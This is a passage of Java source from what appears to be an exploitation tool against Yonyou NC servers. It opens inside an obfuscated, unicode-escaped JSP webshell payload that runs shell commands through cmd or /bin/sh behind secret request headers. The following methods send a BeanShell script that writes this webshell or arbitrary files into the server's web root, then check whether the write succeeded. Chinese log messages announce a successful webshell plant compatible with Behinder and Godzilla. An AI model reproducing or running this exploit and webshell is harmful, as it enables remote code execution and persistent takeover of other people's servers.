lcdTAwNjJcdTAwNzVcdTAwNzRcdTAwNjUoInBheWxvYWQiKT09XHUwMDZlXHUwMDc1XHUwMDZjXHUwMDZjKXsgXHUwMDczXHUwMDY1XHUwMDczXHUwMDczXHUwMDY5XHUwMDZmXHUwMDZlLnNldEF0dHJpYnV0ZSgicGF5bG9hZCIsXHUwMDZlXHUwMDY1XHUwMDc3IFgodGhpcy5cdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzMoKS5cdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDNcdTAwNmNcdTAwNjFcdTAwNzNcdTAwNzNcdTAwNGNcdTAwNmZcdTAwNjFcdTAwNjRcdTAwNjVcdTAwNzIoKSkuUShkYXRhKSk7IH1lbHNleyBcdTAwNzJcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzQuc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIixkYXRhKTtcdTAwNmFcdTAwNjFcdTAwNzZcdTAwNjEuaW8uXHUwMDQyXHUwMDc5XHUwMDc0XHUwMDY1XHUwMDQxXHUwMDcyXHUwMDcyXHUwMDYxXHUwMDc5XHUwMDRmXHUwMDc1XHUwMDc0XHUwMDcwXHUwMDc1XHUwMDc0XHUwMDUzXHUwMDc0XHUwMDcyXHUwMDY1XHUwMDYxXHUwMDZkIGFyck91dD1cdTAwNmVcdTAwNjVcdTAwNzcgXHUwMDZhXHUwMDYxXHUwMDc2XHUwMDYxLmlvLlx1MDA0Mlx1MDA3OVx1MDA3NFx1MDA2NVx1MDA0MVx1MDA3Mlx1MDA3Mlx1MDA2MVx1MDA3OVx1MDA0Zlx1MDA3NVx1MDA3NFx1MDA3MFx1MDA3NVx1MDA3NFx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2NVx1MDA2MVx1MDA2ZCgpO1x1MDA0Zlx1MDA2Mlx1MDA2YVx1MDA2NVx1MDA2M1x1MDA3NCBmPSgoXHUwMDQzXHUwMDZjXHUwMDYxXHUwMDczXHUwMDczKVx1MDA3M1x1MDA2NVx1MDA3M1x1MDA3M1x1MDA2OVx1MDA2Zlx1MDA2ZS5cdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDFcdTAwNzRcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNjJcdTAwNzVcdTAwNzRcdTAwNjUoInBheWxvYWQiKSkubmV3SW5zdGFuY2UoKTtmLlx1MDA2NVx1MDA3MVx1MDA3NVx1MDA2MVx1MDA2Y1x1MDA3MyhhcnJPdXQpO2YuXHUwMDY1XHUwMDcxXHUwMDc1XHUwMDYxXHUwMDZjXHUwMDczKHBhZ2VDb250ZXh0KTtcdTAwNzJcdTAwNjVcdTAwNzNcdTAwNzBcdTAwNmZcdTAwNmVcdTAwNzNcdTAwNjUuZ2V0V3JpdGVyKCkud3JpdGUobWQ1LnN1YnN0cmluZygwLDE2KSk7Zi5cdTAwNzRcdTAwNmZcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNmVcdTAwNjcoKTtcdTAwNzJcdTAwNjVcdTAwNzNcdTAwNzBcdTAwNmZcdTAwNmVcdTAwNzNcdTAwNjUuZ2V0V3JpdGVyKCkud3JpdGUoXHUwMDYyXHUwMDYxXHUwMDczXHUwMDY1XHUwMDM2XHUwMDM0XHUwMDQ1XHUwMDZlXHUwMDYzXHUwMDZmXHUwMDY0XHUwMDY1KHgoYXJyT3V0LnRvQnl0ZUFycmF5KCksIHRydWUpKSk7XHUwMDcyXHUwMDY1XHUwMDczXHUwMDcwXHUwMDZmXHUwMDZlXHUwMDczXHUwMDY1LmdldFdyaXRlcigpLndyaXRlKG1kNS5zdWJzdHJpbmcoMTYpKTsgfSB9XHUwMDYzXHUwMDYxXHUwMDc0XHUwMDYzXHUwMDY4IChcdTAwNDVcdTAwNzhcdTAwNjNcdTAwNjVcdTAwNzBcdTAwNzRcdTAwNjlcdTAwNmZcdTAwNmUgZSl7IH0gfSB9IFx1MDA2M1x1MDA2MVx1MDA3NFx1MDA2M1x1MDA2OCAoXHUwMDQ1XHUwMDc4XHUwMDYzXHUwMDY1XHUwMDcwXHUwMDc0XHUwMDY5XHUwMDZmXHUwMDZlIGUpIHsgfSU%2BPCVcdTAwNzRcdTAwNzJcdTAwNzkgeyBpZiAoXHUwMDcyXHUwMDY1XHUwMDcxXHUwMDc1XHUwMDY1XHUwMDczXHUwMDc0Llx1MDA2N1x1MDA2NVx1MDA3NFx1MDA0OFx1MDA2NVx1MDA2MVx1MDA2NFx1MDA2NVx1MDA3MigieC1jbGllbnQtZGF0YSIpLlx1MDA2NVx1MDA3MVx1MDA3NVx1MDA2MVx1MDA2Y1x1MDA3MygidGVzdHp4Y3YiKSAmJiBcdTAwNzJcdTAwNjVcdTAwNzFcdTAwNzVcdTAwNjVcdTAwNzNcdTAwNzQuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDQ4XHUwMDY1XHUwMDYxXHUwMDY0XHUwMDY1XHUwMDcyKCJ4LWNsaWVudC1yZWZlcmVyIikuXHUwMDY1XHUwMDcxXHUwMDc1XHUwMDYxXHUwMDZjXHUwMDczKCJodHRwOi8vd3d3LmJhaWR1LmNvbS8iKSkgeyBcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNmVcdTAwNjcgXHUwMDY1XHUwMDcxXHUwMDc1XHUwMDYxXHUwMDZjXHUwMDczID0gXHUwMDcyXHUwMDY1XHUwMDcxXHUwMDc1XHUwMDY1XHUwMDczXHUwMDc0Llx1MDA2N1x1MDA2NVx1MDA3NFx1MDA0OFx1MDA2NVx1MDA2MVx1MDA2NFx1MDA2NVx1MDA3MigidGVzdHp4Y3YiKTtpZiAoXHUwMDY1XHUwMDcxXHUwMDc1XHUwMDYxXHUwMDZjXHUwMDczICE9IFx1MDA2ZVx1MDA3NVx1MDA2Y1x1MDA2YyAmJiAhXHUwMDY1XHUwMDcxXHUwMDc1XHUwMDYxXHUwMDZjXHUwMDczLmlzRW1wdHkoKSkgeyBcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNmVcdTAwNjdbXSBcdTAwNjNcdTAwNmRcdTAwNjRcdTAwNzMgPSBcdTAwNmVcdTAwNzVcdTAwNmNcdTAwNmM7aWYgKFN5c3RlbS5nZXRQcm9wZXJ0eSgib3MubmFtZSIpLnRvTG93ZXJDYXNlKCkuY29udGFpbnMoIndpbiIpKSB7IFx1MDA2M1x1MDA2ZFx1MDA2NFx1MDA3MyA9IFx1MDA2ZVx1MDA2NVx1MDA3NyBcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNmVcdTAwNjdbXXsiY21kIiwgIi9jIiwgXHUwMDZlXHUwMDY1XHUwMDc3IFx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2NyhcdTAwNmVcdTAwNjVcdTAwNzcgXHUwMDQyXHUwMDQxXHUwMDUzXHUwMDQ1XHUwMDM2XHUwMDM0XHUwMDQ0XHUwMDY1XHUwMDYzXHUwMDZmXHUwMDY0XHUwMDY1XHUwMDcyKCkuXHUwMDY0XHUwMDY1XHUwMDYzXHUwMDZmXHUwMDY0XHUwMDY1XHUwMDQyXHUwMDc1XHUwMDY2XHUwMDY2XHUwMDY1XHUwMDcyKFx1MDA2NVx1MDA3MVx1MDA3NVx1MDA2MVx1MDA2Y1x1MDA3MykpfTsgfSBlbHNlIHsgXHUwMDYzXHUwMDZkXHUwMDY0XHUwMDczID0gXHUwMDZlXHUwMDY1XHUwMDc3IFx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2N1tdeyIvYmluL3NoIiwgIi1jIiwgXHUwMDZlXHUwMDY1XHUwMDc3IFx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2NyhcdTAwNmVcdTAwNjVcdTAwNzcgXHUwMDQyXHUwMDQxXHUwMDUzXHUwMDQ1XHUwMDM2XHUwMDM0XHUwMDQ0XHUwMDY1XHUwMDYzXHUwMDZmXHUwMDY0XHUwMDY1XHUwMDcyKCkuXHUwMDY0XHUwMDY1XHUwMDYzXHUwMDZmXHUwMDY0XHUwMDY1XHUwMDQyXHUwMDc1XHUwMDY2XHUwMDY2XHUwMDY1XHUwMDcyKFx1MDA2NVx1MDA3MVx1MDA3NVx1MDA2MVx1MDA2Y1x1MDA3MykpfTsgfVx1MDA1MFx1MDA3Mlx1MDA2Zlx1MDA2M1x1MDA2NVx1MDA3M1x1MDA3MyBcdTAwNzBcdTAwNzJcdTAwNmZcdTAwNjNcdTAwNjVcdTAwNzNcdTAwNzMgPSBcdTAwNTJcdTAwNzVcdTAwNmVcdTAwNzRcdTAwNjlcdTAwNmRcdTAwNjUuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDUyXHUwMDc1XHUwMDZlXHUwMDc0XHUwMDY5XHUwMDZkXHUwMDY1KCkuXHUwMDY1XHUwMDc4XHUwMDY1XHUwMDYzKFx1MDA2M1x1MDA2ZFx1MDA2NFx1MDA3Myk7XHUwMDZhXHUwMDYxXHUwMDc2XHUwMDYxLmlvLlx1MDA0Mlx1MDA3NVx1MDA2Nlx1MDA2Nlx1MDA2NVx1MDA3Mlx1MDA2NVx1MDA2NFx1MDA1Mlx1MDA2NVx1MDA2MVx1MDA2NFx1MDA2NVx1MDA3MiBcdTAwNjJcdTAwNzVcdTAwNjZcdTAwNjZcdTAwNjVcdTAwNzJcdTAwNjVcdTAwNjRcdTAwNTJcdTAwNjVcdTAwNjFcdTAwNjRcdTAwNjVcdTAwNzIgPSBcdTAwNmVcdTAwNjVcdTAwNzcgXHUwMDZhXHUwMDYxXHUwMDc2XHUwMDYxLmlvLlx1MDA0Mlx1MDA3NVx1MDA2Nlx1MDA2Nlx1MDA2NVx1MDA3Mlx1MDA2NVx1MDA2NFx1MDA1Mlx1MDA2NVx1MDA2MVx1MDA2NFx1MDA2NVx1MDA3MihcdTAwNmVcdTAwNjVcdTAwNzcgXHUwMDZhXHUwMDYxXHUwMDc2XHUwMDYxLmlvLlx1MDA0OVx1MDA2ZVx1MDA3MFx1MDA3NVx1MDA3NFx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2NVx1MDA2MVx1MDA2ZFx1MDA1Mlx1MDA2NVx1MDA2MVx1MDA2NFx1MDA2NVx1MDA3MihcdTAwNzBcdTAwNzJcdTAwNmZcdTAwNjNcdTAwNjVcdTAwNzNcdTAwNzMuXHUwMDY3XHUwMDY1XHUwMDc0XHUwMDQ5XHUwMDZlXHUwMDcwXHUwMDc1XHUwMDc0XHUwMDUzXHUwMDc0XHUwMDcyXHUwMDY1XHUwMDYxXHUwMDZkKCkpKTtcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNmVcdTAwNjdcdTAwNDJcdTAwNzVcdTAwNjlcdTAwNmNcdTAwNjRcdTAwNjVcdTAwNzIgXHUwMDczXHUwMDc0XHUwMDcyXHUwMDY5XHUwMDZlXHUwMDY3XHUwMDQyXHUwMDc1XHUwMDY5XHUwMDZjXHUwMDY0XHUwMDY1XHUwMDcyID0gXHUwMDZlXHUwMDY1XHUwMDc3IFx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2N1x1MDA0Mlx1MDA3NVx1MDA2OVx1MDA2Y1x1MDA2NFx1MDA2NVx1MDA3MigpO1x1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2NyBsaW5lO3doaWxlICgobGluZSA9IFx1MDA2Mlx1MDA3NVx1MDA2Nlx1MDA2Nlx1MDA2NVx1MDA3Mlx1MDA2NVx1MDA2NFx1MDA1Mlx1MDA2NVx1MDA2MVx1MDA2NFx1MDA2NVx1MDA3Mi5cdTAwNzJcdTAwNjVcdTAwNjFcdTAwNjRcdTAwNGNcdTAwNjlcdTAwNmVcdTAwNjUoKSkgIT0gXHUwMDZlXHUwMDc1XHUwMDZjXHUwMDZjKSB7IFx1MDA3M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2N1x1MDA0Mlx1MDA3NVx1MDA2OVx1MDA2Y1x1MDA2NFx1MDA2NVx1MDA3Mi5cdTAwNjFcdTAwNzBcdTAwNzBcdTAwNjVcdTAwNmVcdTAwNjQobGluZSArICdcbicpOyB9XHUwMDcyXHUwMDY1XHUwMDczXHUwMDcwXHUwMDZmXHUwMDZlXHUwMDczXHUwMDY1Llx1MDA2N1x1MDA2NVx1MDA3NFx1MDA0Zlx1MDA3NVx1MDA3NFx1MDA3MFx1MDA3NVx1MDA3NFx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2NVx1MDA2MVx1MDA2ZCgpLndyaXRlKFx1MDA3M1x1MDA3NFx1MDA3Mlx1MDA2OVx1MDA2ZVx1MDA2N1x1MDA0Mlx1MDA3NVx1MDA2OVx1MDA2Y1x1MDA2NFx1MDA2NVx1MDA3Mi5cdTAwNzRcdTAwNmZcdTAwNTNcdTAwNzRcdTAwNzJcdTAwNjlcdTAwNmVcdTAwNjcoKS5cdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDJcdTAwNzlcdTAwNzRcdTAwNjVcdTAwNzMoKSk7XHUwMDcyXHUwMDY1XHUwMDczXHUwMDcwXHUwMDZmXHUwMDZlXHUwMDczXHUwMDY1Llx1MDA2N1x1MDA2NVx1MDA3NFx1MDA0Zlx1MDA3NVx1MDA3NFx1MDA3MFx1MDA3NVx1MDA3NFx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2NVx1MDA2MVx1MDA2ZCgpLmZsdXNoKCk7XHUwMDcyXHUwMDY1XHUwMDczXHUwMDcwXHUwMDZmXHUwMDZlXHUwMDczXHUwMDY1Llx1MDA2N1x1MDA2NVx1MDA3NFx1MDA0Zlx1MDA3NVx1MDA3NFx1MDA3MFx1MDA3NVx1MDA3NFx1MDA1M1x1MDA3NFx1MDA3Mlx1MDA2NVx1MDA2MVx1MDA2ZCgpLmNsb3NlKCk7XHUwMDcyXHUwMDY1XHUwMDc0XHUwMDc1XHUwMDcyXHUwMDZlO319fVx1MDA2M1x1MDA2MVx1MDA3NFx1MDA2M1x1MDA2OChcdTAwNDVcdTAwNzhcdTAwNjNcdTAwNjVcdTAwNzBcdTAwNzRcdTAwNjlcdTAwNmZcdTAwNmUgZSkgeyB9JT48JVx1MDA2Zlx1MDA3NVx1MDA3NC5wcmludCgiPkA8Iik7JT4%3D%22%3B%0D%0AString+str+%3D+new+String%28decoder.decodeBuffer%28data%29%2C+%22utf-8%22%29%3B%0D%0Afw.write%28str%29%3B%0D%0Afw.close%28%29%3B%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A";

            // post 请求
            MyHttpUtil.post(conn, postData.getBytes(StandardCharsets.UTF_8));

            // 处理响应
            int responseCode = MyHttpUtil.getResponseCode(conn);

            if (responseCode == HttpURLConnection.HTTP_OK) {
                URL secondUrl = new URL(Config.TARGET + "/" + filename);
                HttpURLConnection secondConn = (HttpURLConnection) secondUrl.openConnection();

                // 设置超时
                MyHttpUtil.setTimeout(secondConn);

                MyHttpUtil.get(secondConn);
                int responseCode2 = MyHttpUtil.getResponseCode(secondConn);
                String responseText2 = MyHttpUtil.getResponseText(secondConn);
                if (responseCode2 == HttpURLConnection.HTTP_OK && responseText2.contains(">@<")) {
                    logMessage("[+] webshell 写入成功! 同时写入回显/冰蝎/哥斯拉, 连接地址: " + Config.TARGET + "/" + filename + "\n[+] 请求头与连接密码见 README.md.");
                    return true;
                } else {
                    logMessage("[-] webshell 写入失败, 请尝试手动利用.");
                    return false;
                }
            } else {
                logMessage("[-] webshell 写入失败, 请尝试手动利用.");
                return false;
            }
        } catch (Exception e) {
            logMessage("[-] webshell 写入失败, 请尝试手动利用." + e);
            return false;
        }
    }

    private boolean upload(String url) {
        try {
            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            URL apiUrl = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            MyHttpUtil.setTimeout(conn);

            String fileName = Config.FILENAME;
            byte[] fileText = Base64.getEncoder().encode(Config.FILETEXT.getBytes(StandardCharsets.UTF_8));
            String postData = "bsh.script=" + "import+sun.misc.BASE64Decoder%3B%0D%0A%0D%0ABASE64Decoder+decoder+%3D+new+BASE64Decoder%28%29%3B%0D%0AFileWriter+fw+%3D+new+FileWriter%28new+File%28%22.%2Fwebapps%2Fnc_web%2F" + fileName + "%22%29%29%3B%0D%0AString+data+%3D+%22" + URLEncoder.encode(new String(fileText, "UTF-8")) + "%22%3B%0D%0AString+str+%3D+new+String%28decoder.decodeBuffer%28data%29%2C+%22utf-8%22%29%3B%0D%0Afw.write%28str%29%3B%0D%0Afw.close%28%29%3B";

            // post 请求
            MyHttpUtil.post(conn, postData.getBytes(StandardCharsets.UTF_8));

            // 处理响应
            int responseCode = MyHttpUtil.getResponseCode(conn);

            if (responseCode == HttpURLConnection.HTTP_OK) {
                URL secondUrl = new URL(Config.TARGET + "/" + fileName);
                HttpURLConnection secondConn = (HttpURLConnection) secondUrl.openConnection();

                // 设置超时
                MyHttpUtil.setTimeout(secondConn);

                MyHttpUtil.get(secondConn);
                int responseCode2 = MyHttpUtil.getResponseCode(secondConn);
                if (responseCode2 == HttpURLConnection.HTTP_OK) {
                    logUpload("[+] 文件上传成功! 文件地址: " + Config.TARGET + "/" + fileName);
                    return true;
                } else {
                    logUpload("[-] 文件上传失败, 请尝试手动利用.");
                    return false;
                }
            } else {
                logUpload("[-] 文件上传失败, 请尝试手动利用.");
                return false;
            }
        } catch (Exception e) {
            logUpload("[-] 文件上传失败, 请尝试手动利用." + e);
            return false;
        }
    }
}
